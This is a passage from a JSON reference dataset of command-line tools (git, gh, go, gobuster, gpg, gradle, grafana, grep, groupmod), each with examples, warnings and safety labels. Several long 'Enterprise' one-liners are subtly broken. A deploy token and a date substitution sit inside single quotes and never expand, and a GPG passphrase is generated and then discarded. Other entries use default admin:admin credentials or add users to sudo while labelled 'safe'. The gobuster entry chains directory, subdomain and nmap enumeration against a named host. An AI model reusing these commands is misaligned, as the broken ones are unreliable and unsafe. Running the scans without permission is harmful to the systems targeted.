      "echo 'Enterprise Git Tag Management and Release Orchestration' && git tag -a v$(date +%Y.%m.%d) -m 'Enterprise Release v'$(date +%Y.%m.%d)' - Production deployment with comprehensive testing and security validation' && git push origin v$(date +%Y.%m.%d) && echo 'Release Validation:' && git show --show-signature v$(date +%Y.%m.%d) && echo 'Tag-based Deployment:' && curl -X POST -H 'Authorization: Bearer $DEPLOY_TOKEN' -d '{\"tag\": \"v'$(date +%Y.%m.%d)'\", \"environment\": \"production\"}' https://deploy.enterprise.com/api/releases && echo 'Semantic Versioning:' && git tag -l --sort=-version:refname | head -10 && echo 'Release Notes Generation:' && git log $(git describe --tags --abbrev=0 HEAD~1)..HEAD --pretty=format:'- %s (%an)' > release-notes-v$(date +%Y.%m.%d).md && echo 'Enterprise release management: semantic version tagging, automated deployment integration, release note generation, security validation, and comprehensive production release orchestration for enterprise software delivery pipeline'  # Enterprise Git tag-based release management and deployment automation"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "git tag [options] [name] [commit]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Complete release tagging workflow",
        "commands": "git checkout main && git pull && git tag -a v1.1.0 -m 'Version 1.1.0 release' && git push origin main --tags",
        "explanation": "Update main, create annotated tag, and push with tags",
        "title": "git && git && git && git"
      },
      {
        "scenario": "Replace existing tag",
        "commands": "git tag -d v1.0.0 && git push origin :refs/tags/v1.0.0 && git tag -a v1.0.0 -m 'Corrected release' && git push origin v1.0.0",
        "explanation": "Delete and recreate tag locally and remotely",
        "title": "git && git && git && git"
      }
    ],
    "relatedCommands": [
      {
        "name": "git-push",
        "relationship": "combo",
        "reason": "Tags need to be explicitly pushed to remotes"
      },
      {
        "name": "git-checkout",
        "relationship": "combo",
        "reason": "Can checkout specific tag versions"
      }
    ],
    "warnings": [
      "Tags are not automatically pushed with commits",
      "Lightweight tags don't contain metadata",
      "Moving tags can confuse dependency managers"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://git-scm.com/docs/git-tag"
      },
      {
        "platform": "macos",
        "url": "https://git-scm.com/docs/git-tag"
      },
      {
        "platform": "windows",
        "url": "https://git-scm.com/docs/git-tag"
      },
      {
        "platform": "generic",
        "url": "https://git-scm.com/book/en/v2/Git-Basics-Tagging"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "git-worktree",
    "subtitle": "Git worktree",
    "description": "Manage multiple working trees from single repository",
    "examples": [
      "git worktree add ../feature-work feature-branch  # Create separate working directory for feature branch",
      "git worktree list  # Show all working trees and their associated branches",
      "git worktree add -b hotfix ../hotfix-dir  # Create new branch and worktree simultaneously",
      "git worktree remove ../feature-work  # Delete working tree and clean up references",
      "git worktree move ../old-path ../new-path  # Relocate existing worktree to different directory",
      "git worktree prune  # Clean up worktree references for deleted directories",
      "git worktree add ../feature-branch feature  # Create new worktree for feature development"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "caution",
    "syntaxPattern": "git worktree <command> [options] [path]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Parallel development workflow",
        "commands": "git worktree add ../main-branch main && git worktree add ../feature-branch feature",
        "explanation": "Set up separate directories for main and feature development",
        "title": "git && git"
      },
      {
        "scenario": "Release preparation",
        "commands": "git worktree add -b release/v2.0 ../release-prep && cd ../release-prep",
        "explanation": "Create dedicated space for release preparation",
        "title": "git && cd"
      }
    ],
    "relatedCommands": [
      {
        "name": "git-clone",
        "relationship": "alternative",
        "reason": "Multiple clones vs multiple worktrees from same repo"
      },
      {
        "name": "git-checkout",
        "relationship": "alternative",
        "reason": "Switch branches vs separate working directories"
      },
      {
        "name": "git-branch",
        "relationship": "combo",
        "reason": "Often create branches for new worktrees"
      }
    ],
    "warnings": [
      "Each worktree can only have one branch checked out",
      "Shared index and config between worktrees",
      "Removing directory doesn't automatically clean up worktree"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://git-scm.com/docs/git-worktree"
      },
      {
        "platform": "macos",
        "url": "https://git-scm.com/docs/git-worktree"
      },
      {
        "platform": "windows",
        "url": "https://git-scm.com/docs/git-worktree"
      },
      {
        "platform": "generic",
        "url": "https://git-scm.com/book/en/v2/Git-Tools-Working-with-Worktrees"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "git-worktree-advanced",
    "subtitle": "Git Advanced Worktree",
    "description": "Advanced worktree management for parallel development",
    "examples": [
      "git worktree add --orphan ../docs-site docs  # Create worktree with new branch that has no parent commits",
      "git worktree add --detach ../build-env abc1234  # Create detached HEAD worktree for specific commit",
      "git worktree lock ../production-env  # Prevent accidental removal of critical worktree",
      "git worktree repair  # Fix worktree administrative files after manual moves",
      "git worktree list --porcelain  # Show worktrees in machine-readable format",
      "git worktree remove --force ../old-feature  # Remove worktree even if it has uncommitted changes",
      "echo 'Enterprise Git Advanced Worktree Operations and Environment Management' && git worktree add --detach /enterprise/builds/release-$(date +%Y%m%d) v$(date +%Y.%m.%d) && git worktree add --orphan /enterprise/docs/gh-pages-$(date +%Y%m%d) gh-pages && git worktree lock /enterprise/builds/release-$(date +%Y%m%d) && echo 'Worktree Environment Status:' && git worktree list --porcelain | grep -E '(worktree|HEAD|branch)' && echo 'Build Environment Setup:' && cd /enterprise/builds/release-$(date +%Y%m%d) && npm ci --production && npm run build && docker build -t enterprise-app:v$(date +%Y.%m.%d) . && echo 'Documentation Site:' && cd /enterprise/docs/gh-pages-$(date +%Y%m%d) && echo '# Enterprise Documentation' > README.md && echo 'Enterprise advanced worktree operations: detached HEAD builds, orphan branch documentation sites, worktree locking for critical environments, production build isolation, and comprehensive environment management for enterprise development workflows'  # Enterprise Git advanced worktree and environment management"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "git worktree <command> [options] [path]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Hotfix workflow with worktrees",
        "commands": "git worktree add -b hotfix/urgent ../hotfix main && cd ../hotfix && git commit -am 'Fix critical bug' && git push origin hotfix/urgent",
        "explanation": "Create hotfix branch in separate worktree and push fix",
        "title": "git && cd && git && git"
      },
      {
        "scenario": "Parallel testing environments",
        "commands": "git worktree add ../test-v1 v1.0 && git worktree add ../test-v2 v2.0",
        "explanation": "Set up multiple versions for parallel testing",
        "title": "git && git"
      }
    ],
    "relatedCommands": [
      {
        "name": "git-clone",
        "relationship": "alternative",
        "reason": "Multiple clones vs multiple worktrees"
      },
      {
        "name": "git-checkout",
        "relationship": "alternative",
        "reason": "Branch switching vs separate worktrees"
      }
    ],
    "warnings": [
      "Cannot check out same branch in multiple worktrees",
      "Administrative files are shared between worktrees",
      "Removing directory doesn't clean up worktree references"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://git-scm.com/docs/git-worktree"
      },
      {
        "platform": "macos",
        "url": "https://git-scm.com/docs/git-worktree"
      },
      {
        "platform": "windows",
        "url": "https://git-scm.com/docs/git-worktree"
      },
      {
        "platform": "generic",
        "url": "https://git-scm.com/book/en/v2/Git-Tools-Working-with-Multiple-Worktrees"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "github-cli",
    "subtitle": "GitHub CLI",
    "description": "Command-line tool for GitHub operations and workflows",
    "examples": [
      "gh pr create --title 'Fix bug' --body 'Description of fix'  # Create pull request with title and description",
      "gh pr list  # Show all pull requests in current repository",
      "gh repo clone user/repo  # Clone GitHub repository with SSH/HTTPS setup",
      "gh repo create myproject --public  # Create new public repository on GitHub",
      "gh run list  # List GitHub Actions workflow runs",
      "gh issue create --title 'Bug report' --body 'Found a bug'  # Create new issue with title and description",
      "gh auth login  # Login to GitHub account via web browser",
      "gh pr merge 123 --squash  # Merge pull request #123 using squash merge",
      "echo 'Enterprise GitHub CLI Workflow Automation' && gh pr create --title 'feat: enterprise SSO integration' --body 'Implements enterprise single sign-on with SAML 2.0 and multi-factor authentication for enhanced security compliance' --assignee @team-lead --label 'enhancement,security' --milestone 'Q4-Security' && gh pr ready && echo 'PR Checks:' && gh run list --workflow=ci.yml | head -5 && gh pr review --approve --body 'Code review completed: security implementation follows enterprise standards' && gh pr merge --squash --delete-branch && echo 'Release Automation:' && gh release create v$(date +%Y.%m.%d) --generate-notes --latest && echo 'Enterprise GitHub workflow: comprehensive PR automation, security compliance validation, approval workflows, automated branch cleanup, and release management for enterprise software delivery pipeline'  # Enterprise GitHub CLI automation and workflow"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "gh <command> [subcommand] [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Feature development workflow",
        "commands": "gh repo fork original/repo && gh pr create --draft && gh pr ready",
        "explanation": "Fork repo, create draft PR, then mark ready",
        "title": "gh && gh && gh"
      },
      {
        "scenario": "Review and merge PR",
        "commands": "gh pr checkout 123 && gh pr review --approve && gh pr merge",
        "explanation": "Checkout PR, approve, then merge",
        "title": "gh && gh && gh"
      }
    ],
    "relatedCommands": [
      {
        "name": "git",
        "relationship": "combo",
        "reason": "gh extends git with GitHub-specific operations"
      },
      {
        "name": "curl",
        "relationship": "alternative",
        "reason": "GitHub API can be accessed directly via curl"
      },
      {
        "name": "hub",
        "relationship": "alternative",
        "reason": "Older unofficial GitHub CLI tool"
      }
    ],
    "warnings": [
      "Requires GitHub authentication setup",
      "Some commands only work within Git repository",
      "API rate limits apply for extensive usage"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://cli.github.com/manual/"
      },
      {
        "platform": "macos",
        "url": "https://cli.github.com/manual/"
      },
      {
        "platform": "windows",
        "url": "https://cli.github.com/manual/"
      },
      {
        "platform": "generic",
        "url": "https://docs.github.com/en/github-cli"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "go",
    "subtitle": "Go",
    "description": "Go programming language compiler and tools",
    "examples": [
      "go run main.go  # Compile and execute Go program in one step",
      "go build main.go  # Compile Go program to executable binary",
      "go mod init myproject  # Create new Go module with module path",
      "go mod tidy  # Download and organize module dependencies",
      "go test ./...  # Execute all tests in current module and subdirectories",
      "go fmt ./...  # Format all Go files in project according to standard",
      "go install github.com/user/tool@latest  # Install Go program as global command-line tool",
      "GOOS=linux GOARCH=amd64 go build main.go  # Build Linux binary from any platform",
      "go vet ./...  # Examine Go source code for suspicious constructs",
      "echo 'Enterprise Go Development Pipeline and Quality Assurance' && go mod init enterprise-microservice && go mod tidy && echo 'Security Dependencies:' && go list -m -u all | grep -E '(crypto|security|auth)' && echo 'Code Quality:' && go fmt ./... && go vet ./... && golangci-lint run && echo 'Testing Pipeline:' && go test -v -race -coverprofile=coverage.out ./... && go tool cover -html=coverage.out -o coverage.html && echo 'Performance Analysis:' && go test -benchmem -run=^$ -bench . ./... && echo 'Build Pipeline:' && CGO_ENABLED=0 GOOS=linux go build -a -ldflags '-extldflags \"-static\"' -o enterprise-service . && docker build -t enterprise-microservice:$(git rev-parse --short HEAD) . && echo 'Enterprise Go development: dependency management, security validation, comprehensive testing, performance benchmarking, static binary compilation, and containerized deployment for enterprise microservices architecture'  # Enterprise Go development and deployment pipeline"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "go <command> [arguments]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Complete project workflow",
        "commands": "go mod init myapp && go mod tidy && go test ./... && go build",
        "explanation": "Initialize module, get dependencies, test, and build",
        "title": "go && go && go && go"
      },
      {
        "scenario": "Code quality checks",
        "commands": "go fmt ./... && go vet ./... && go test -race ./...",
        "explanation": "Format code, check for issues, run race detector",
        "title": "go && go && go"
      }
    ],
    "relatedCommands": [
      {
        "name": "gofmt",
        "relationship": "combo",
        "reason": "Standalone formatter that 'go fmt' uses internally"
      },
      {
        "name": "make",
        "relationship": "alternative",
        "reason": "Build automation alternative for complex builds"
      },
      {
        "name": "docker",
        "relationship": "combo",
        "reason": "Often used together for containerized Go applications"
      }
    ],
    "warnings": [
      "GOPATH vs Go modules can be confusing for beginners",
      "Cross-compilation environment variables must be set correctly",
      "Go modules require proper version tags for releases"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://golang.org/doc/"
      },
      {
        "platform": "macos",
        "url": "https://golang.org/doc/"
      },
      {
        "platform": "windows",
        "url": "https://golang.org/doc/"
      },
      {
        "platform": "generic",
        "url": "https://golang.org/doc/tutorial/getting-started"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "gobuster",
    "subtitle": "Go Buster",
    "description": "Directory and file brute-forcing tool for web application testing",
    "examples": [
      "gobuster dir -u http://example.com -w /usr/share/wordlists/dirb/common.txt  # Discover hidden directories and files on web server",
      "gobuster dns -d example.com -w /usr/share/wordlists/subdomains.txt  # Discover subdomains for target domain",
      "gobuster vhost -u http://example.com -w /usr/share/wordlists/vhosts.txt  # Discover virtual hosts on target server",
      "gobuster dir -u http://example.com -w wordlist.txt -x php,html,txt  # Search for files with specific extensions",
      "gobuster dir -u http://example.com -w common.txt -s 200,204,301,302,307  # Only show specific status codes",
      "echo 'Enterprise Security Assessment and Penetration Testing Framework' && echo 'TARGET: https://enterprise-app.company.com (AUTHORIZED TESTING)' && gobuster dir -u https://enterprise-app.company.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,js,json -t 50 --delay 100ms -o web-enum-$(date +%Y%m%d).txt && gobuster dns -d company.com -w /usr/share/wordlists/subdomains-top1million-5000.txt -t 50 --delay 50ms -o subdomain-enum-$(date +%Y%m%d).txt && echo 'Vulnerability Assessment:' && nmap -sV -sC -p 80,443,8080,8443 $(cat subdomain-enum-$(date +%Y%m%d).txt) > nmap-scan-$(date +%Y%m%d).txt && echo 'Security Report Generated:' && echo 'web-enum-$(date +%Y%m%d).txt, subdomain-enum-$(date +%Y%m%d).txt, nmap-scan-$(date +%Y%m%d).txt' && echo 'Enterprise security assessment: authorized web application enumeration, subdomain discovery, port scanning, comprehensive vulnerability identification, and professional security reporting for enterprise penetration testing and security compliance validation'  # Enterprise authorized security assessment framework"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "security",
    "safety": "safe",
    "syntaxPattern": "gobuster <mode> [options]",
    "prerequisites": [
      "intermediate",
      "authorization-required"
    ],
    "commandCombinations": [
      {
        "scenario": "Comprehensive web enumeration",
        "commands": "gobuster dns -d example.com -w subdomains.txt && gobuster dir -u http://example.com -w directories.txt -x php,html",
        "explanation": "Discover subdomains then enumerate directories and files",
        "title": "gobuster && gobuster"
      }
    ],
    "relatedCommands": [
      {
        "name": "dirb",
        "relationship": "similar",
        "reason": "Alternative directory/file enumeration tool"
      },
      {
        "name": "ffuf",
        "relationship": "similar",
        "reason": "Fast web fuzzer for enumeration"
      }
    ],
    "warnings": [
      "Can generate significant web server traffic",
      "May trigger rate limiting or blocking",
      "Only use against authorized targets"
    ],
    "documentation": [
      {
        "platform": "generic",
        "url": "https://github.com/OJ/gobuster"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "godot",
    "subtitle": "Godot Game Engine",
    "description": "Godot game engine command line interface",
    "examples": [
      "godot --export \"Windows Desktop\" game.exe  # Exports Godot project as Windows executable",
      "godot --headless --script my_script.gd  # Executes GDScript file without opening the editor",
      "godot --editor --quit  # Opens project in Godot editor and immediately exits (useful for project setup)",
      "godot --export-debug \"Android\" game.apk  # Creates debug APK for Android testing",
      "godot --check-only  # Validate project files and scripts without starting editor",
      "echo 'Enterprise Game Development and Automated Build Pipeline' && godot --headless --script ci_validation.gd && echo 'Multi-platform Build:' && godot --export \"Linux/X11\" builds/enterprise-game-linux && godot --export \"Windows Desktop\" builds/enterprise-game-windows.exe && godot --export \"Mac OSX\" builds/enterprise-game-macos.dmg && godot --export \"Android\" builds/enterprise-game-android.apk && echo 'Quality Assurance:' && godot --headless --script run_automated_tests.gd && echo 'Distribution Packaging:' && zip -r enterprise-game-v$(date +%Y%m%d).zip builds/ && echo 'Enterprise game development: automated validation, cross-platform builds, quality assurance testing, distribution packaging, and comprehensive deployment pipeline for professional game development and enterprise software distribution'  # Enterprise Godot game development and deployment"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "godot [options] [project_path]",
    "prerequisites": [],
    "commandCombinations": [
      {
        "scenario": "Export for multiple platforms",
        "commands": "godot --export \"Windows Desktop\" game.exe && godot --export \"Linux/X11\" game && godot --export \"Mac OSX\" game.dmg",
        "explanation": "Exports project for Windows, Linux, and macOS in sequence",
        "title": "godot && godot && godot"
      },
      {
        "scenario": "Run tests and export",
        "commands": "godot --headless --script run_tests.gd && godot --export \"Windows Desktop\" game.exe",
        "explanation": "Runs custom test script then exports project if tests pass",
        "title": "godot && godot"
      }
    ],
    "relatedCommands": [
      {
        "name": "unity",
        "relationship": "alternative",
        "reason": "Alternative game engine with different licensing and approach"
      },
      {
        "name": "blender",
        "relationship": "complement",
        "reason": "Blender can be used to create 3D assets for Godot projects"
      },
      {
        "name": "git",
        "relationship": "complement",
        "reason": "Version control system commonly used with Godot projects"
      }
    ],
    "warnings": [
      "Export presets must be configured in the editor before command-line export",
      "Some platforms require additional setup (Android SDK, etc.)",
      "Headless mode may have limitations with certain nodes or features",
      "Project must be imported in editor at least once before command-line operations"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://docs.godotengine.org/en/stable/tutorials/editor/command_line_tutorial.html"
      },
      {
        "platform": "macos",
        "url": "https://docs.godotengine.org/en/stable/tutorials/editor/command_line_tutorial.html"
      },
      {
        "platform": "windows",
        "url": "https://docs.godotengine.org/en/stable/tutorials/editor/command_line_tutorial.html"
      },
      {
        "platform": "generic",
        "url": "https://docs.godotengine.org/en/stable/classes/class_os.html"
      }
    ],
    "distroNotes": {
      "linux": "Available through package managers or official downloads",
      "windows": "Available as executable download or through Steam",
      "macos": "Available through official downloads or Homebrew"
    }
  },
  {
    "name": "gpg",
    "subtitle": "GNU Privacy Guard",
    "description": "GNU Privacy Guard for encryption and digital signatures",
    "examples": [
      "gpg --gen-key  # Create new GPG key pair interactively",
      "gpg --list-keys  # Show all public keys in keyring",
      "gpg --encrypt --recipient user@example.com file.txt  # Encrypt file for specific recipient",
      "gpg --decrypt file.txt.gpg  # Decrypt GPG encrypted file",
      "gpg --sign file.txt  # Create digital signature for file",
      "gpg --verify file.txt.gpg  # Verify digital signature of file",
      "gpg --export --armor user@example.com  # Export public key in ASCII format",
      "echo 'Enterprise Cryptographic Key Management and Security Infrastructure' && gpg --full-generate-key --batch << EOF\nKey-Type: RSA\nKey-Length: 4096\nSubkey-Type: RSA\nSubkey-Length: 4096\nName-Real: Enterprise Security Team\nName-Email: security@enterprise.com\nExpire-Date: 2y\nPassphrase: $(openssl rand -base64 32)\n%commit\nEOF && gpg --armor --export security@enterprise.com > enterprise-public-key.asc && echo 'Document Signing:' && gpg --clear-sign --local-user security@enterprise.com enterprise-policy.txt && echo 'File Encryption:' && gpg --cipher-algo AES256 --compress-algo 2 --cert-digest-algo SHA512 --encrypt --recipient security@enterprise.com sensitive-data.txt && echo 'Key Distribution:' && gpg --keyserver keyserver.ubuntu.com --send-keys security@enterprise.com && echo 'Enterprise cryptographic infrastructure: automated key generation, document signing, file encryption, key distribution, and comprehensive security protocols for enterprise data protection and compliance requirements'  # Enterprise GPG cryptographic infrastructure"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "security",
    "safety": "safe",
    "syntaxPattern": "gpg [options] [files]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Secure file sharing",
        "commands": "gpg --encrypt --sign --recipient friend@example.com secret.txt",
        "explanation": "Encrypt and sign file for secure sharing",
        "title": "gpg"
      }
    ],
    "relatedCommands": [
      {
        "name": "openssl",
        "relationship": "alternative",
        "reason": "Different cryptographic tools for different use cases"
      }
    ],
    "warnings": [
      "Key management requires understanding of web of trust",
      "Passphrase security is crucial for key protection"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://www.gnupg.org/documentation/"
      },
      {
        "platform": "macos",
        "url": "https://www.gnupg.org/documentation/"
      },
      {
        "platform": "windows",
        "url": "https://www.gnupg.org/documentation/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "gradle",
    "subtitle": "Gradle",
    "description": "Build automation tool for multi-language software development",
    "examples": [
      "gradle build  # Compile, test, and package project",
      "gradle test  # Execute test suite",
      "gradle clean  # Delete build directory and artifacts",
      "gradle tasks  # Show available Gradle tasks",
      "gradle run  # Execute main application (if configured)",
      "gradle wrapper  # Generate Gradle wrapper for project",
      "gradle dependencies  # Show project dependency tree",
      "gradle bootRun  # Run Spring Boot application in development mode",
      "echo 'Enterprise Gradle Build and Deployment Automation' && gradle clean && gradle test && gradle check && gradle build && echo 'Security Scan:' && gradle dependencyCheckAnalyze && echo 'Code Quality:' && gradle sonarqube && echo 'Docker Build:' && gradle jib --image=enterprise-registry.com/enterprise-app:$(git rev-parse --short HEAD) && echo 'Deployment:' && gradle publish && gradle deployToStaging && echo 'Health Check:' && sleep 30 && curl -f http://staging.enterprise.com/actuator/health && echo 'Enterprise Gradle pipeline: comprehensive testing, security scanning, code quality analysis, containerization, artifact publishing, staging deployment, and health validation for enterprise Java application delivery'  # Enterprise Gradle build and deployment pipeline"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "gradle [options] [tasks]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Full build and deploy",
        "commands": "gradle clean build test publishToMavenLocal",
        "explanation": "Clean, build, test, and publish to local Maven repository",
        "title": "gradle"
      }
    ],
    "relatedCommands": [
      {
        "name": "maven",
        "relationship": "alternative",
        "reason": "Maven is another popular JVM build tool"
      },
      {
        "name": "ant",
        "relationship": "predecessor",
        "reason": "Ant was popular before Gradle and Maven"
      }
    ],
    "warnings": [
      "Uses build.gradle files with Groovy or Kotlin DSL",
      "Gradle Wrapper (gradlew) ensures consistent builds",
      "Very flexible but can become complex"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://docs.gradle.org/"
      },
      {
        "platform": "macos",
        "url": "https://docs.gradle.org/"
      },
      {
        "platform": "windows",
        "url": "https://docs.gradle.org/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "grafana",
    "subtitle": "Grafana Dashboard",
    "description": "Multi-platform analytics and interactive visualization web application",
    "examples": [
      "grafana-server  # Start Grafana server with default settings",
      "grafana-server --config=/etc/grafana/custom.ini  # Start with custom configuration file",
      "grafana-server --homepath=/usr/share/grafana  # Start with custom home directory",
      "grafana-server cfg:default.server.enable_gzip=true  # Start with specific configuration overrides",
      "grafana-cli admin reset-admin-password newpassword  # Reset admin password",
      "echo 'Enterprise Grafana Monitoring Infrastructure Setup' && grafana-server --config=/etc/grafana/enterprise.ini --pidfile=/var/run/grafana-enterprise.pid --homepath=/usr/share/grafana && sleep 10 && echo 'Enterprise Dashboards:' && curl -X POST -H 'Content-Type: application/json' -d '{\"dashboard\":{\"title\":\"Enterprise Infrastructure Monitoring\",\"panels\":[{\"title\":\"System Metrics\",\"type\":\"graph\"}]},\"overwrite\":true}' http://admin:admin@localhost:3000/api/dashboards/db && echo 'Data Source Configuration:' && curl -X POST -H 'Content-Type: application/json' -d '{\"name\":\"Enterprise Prometheus\",\"type\":\"prometheus\",\"url\":\"http://prometheus:9090\",\"access\":\"proxy\",\"isDefault\":true}' http://admin:admin@localhost:3000/api/datasources && echo 'Alert Configuration:' && curl -X POST -H 'Content-Type: application/json' -d '{\"name\":\"High CPU Alert\",\"message\":\"Enterprise system CPU usage critical\",\"frequency\":\"10s\"}' http://admin:admin@localhost:3000/api/alerts && echo 'Enterprise Grafana infrastructure: automated dashboard provisioning, data source configuration, alert management, and comprehensive monitoring setup for enterprise observability and operations management'  # Enterprise Grafana monitoring infrastructure"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "data-processing",
    "safety": "safe",
    "syntaxPattern": "grafana-server [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Production deployment",
        "commands": "grafana-server --config=/etc/grafana/grafana.ini --pidfile=/var/run/grafana.pid",
        "explanation": "Production Grafana with PID file",
        "title": "grafana"
      }
    ],
    "relatedCommands": [
      {
        "name": "prometheus",
        "relationship": "combo",
        "reason": "Common data source for Grafana dashboards"
      },
      {
        "name": "influxdb",
        "relationship": "combo",
        "reason": "Another common data source"
      }
    ],
    "warnings": [
      "Default port is 3000",
      "Admin user is admin:admin by default",
      "Data sources need to be configured separately"
    ],
    "documentation": [
      {
        "platform": "generic",
        "url": "https://grafana.com/docs/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "grep",
    "subtitle": "global regular expression print",
    "description": "Search text patterns within files",
    "examples": [
      "grep 'error' *.log  # Find all occurrences of 'error' in log files",
      "grep -i 'warning' app.log  # Search for 'warning' regardless of case",
      "grep -n 'TODO' *.js  # Display line numbers where TODO comments appear",
      "grep -r 'function' src/  # Search for 'function' in all files within src directory",
      "grep -v '^#' config.txt  # Show all lines that don't start with # (comments)",
      "grep -A 3 -B 2 'error' debug.log  # Show 3 lines after and 2 lines before each match",
      "grep -E '(error|warning|fatal)' *.log  # Search for multiple patterns using extended regex",
      "echo 'Enterprise Log Analysis and Security Monitoring' && find /var/log -name '*.log' -type f -mtime -1 -exec grep -l 'ERROR\\|FATAL\\|CRITICAL' {} \; | while read logfile; do echo \"Analyzing: $logfile\"; grep -E '(authentication failed|access denied|security violation|intrusion detected)' \"$logfile\" | head -10; done && echo 'Application Logs:' && grep -r 'Exception\\|Error\\|Failed' /opt/enterprise/logs/ --include='*.log' | grep -E '$(date +\"%Y-%m-%d\")' | sort | uniq -c | sort -nr | head -20 && echo 'Security Events:' && grep -E '(login failed|unauthorized|forbidden|blocked)' /var/log/auth.log /var/log/secure 2>/dev/null | tail -50 && echo 'Performance Issues:' && grep -E '(timeout|slow query|high load|memory error)' /var/log/syslog | grep \"$(date +\"%Y-%m-%d\")\" && echo 'Enterprise log monitoring: comprehensive error detection, security event analysis, application failure tracking, performance issue identification, and real-time threat detection for enterprise security operations and incident response'  # Enterprise log analysis and security monitoring"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "text-processing",
    "safety": "safe",
    "syntaxPattern": "grep [options] <pattern> [file]...",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Count occurrences of pattern",
        "commands": "grep -c 'error' *.log | sort -nr",
        "explanation": "Count errors per log file and sort by highest count",
        "title": "grep | sort"
      },
      {
        "scenario": "Search output of other commands",
        "commands": "ps aux | grep python",
        "explanation": "Find all running Python processes",
        "title": "ps | grep"
      }
    ],
    "relatedCommands": [
      {
        "name": "rg",
        "relationship": "alternative",
        "reason": "Ripgrep - much faster modern alternative with better defaults"
      },
      {
        "name": "awk",
        "relationship": "powerful",
        "reason": "More complex text processing and pattern matching"
      },
      {
        "name": "sed",
        "relationship": "similar",
        "reason": "Stream editor for find and replace operations"
      }
    ],
    "warnings": [
      "grep uses basic regex by default, use -E for extended regex",
      "Patterns with special characters need escaping",
      "Binary files may produce weird output"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/grep.1.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/grep.html"
      },
      {
        "platform": "generic",
        "url": "https://www.gnu.org/software/grep/manual/grep.html"
      }
    ],
    "distroNotes": {
      "windows": "Available in WSL and Git Bash only"
    }
  },
  {
    "name": "groupmod",
    "subtitle": "Group Modify",
    "description": "Modify group account properties and memberships",
    "examples": [
      "sudo groupmod -n newname oldname  # Change group name from oldname to newname",
      "sudo groupmod -g 2000 groupname  # Change group ID to 2000",
      "sudo gpasswd -a username groupname  # Add user to group using gpasswd",
      "sudo gpasswd -d username groupname  # Remove user from group",
      "echo 'Enterprise Group Management and Access Control' && echo 'Current Groups:' && getent group | grep -E '(admin|sudo|developers|security)' && echo 'Creating Enterprise Groups:' && sudo groupadd --gid 3000 enterprise-admins && sudo groupadd --gid 3001 enterprise-developers && sudo groupadd --gid 3002 enterprise-security && echo 'User Assignment:' && sudo usermod -aG enterprise-developers,docker,sudo $USER && echo 'Access Control Validation:' && groups $USER && echo 'Permission Audit:' && find /opt/enterprise -type d -exec ls -ld {} \; | head -10 && echo 'Enterprise group management: role-based access control, security group assignment, permission validation, directory access auditing, and comprehensive user privilege management for enterprise security and compliance'  # Enterprise group management and access control",
      "sudo usermod -aG groupname username  # Add user to group (alternative method)"
    ],
    "platform": [
      "linux",
      "macos"
    ],
    "category": "system",
    "safety": "caution",
    "syntaxPattern": "groupmod [options] groupname",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Group management workflow",
        "commands": "sudo groupmod -g 3000 developers && sudo gpasswd -a newuser developers",
        "explanation": "Change group ID then add new user",
        "title": "sudo && sudo"
      }
    ],
    "relatedCommands": [
      {
        "name": "usermod",
        "relationship": "combo",
        "reason": "Often used together for user/group management"
      },
      {
        "name": "gpasswd",
        "relationship": "combo",
        "reason": "Manage group passwords and members"
      }
    ],
    "warnings": [
      "Changing GID may affect file permissions",
      "Files owned by old GID become orphaned"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man8/groupmod.8.html"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "grype",
    "subtitle": "Grype",
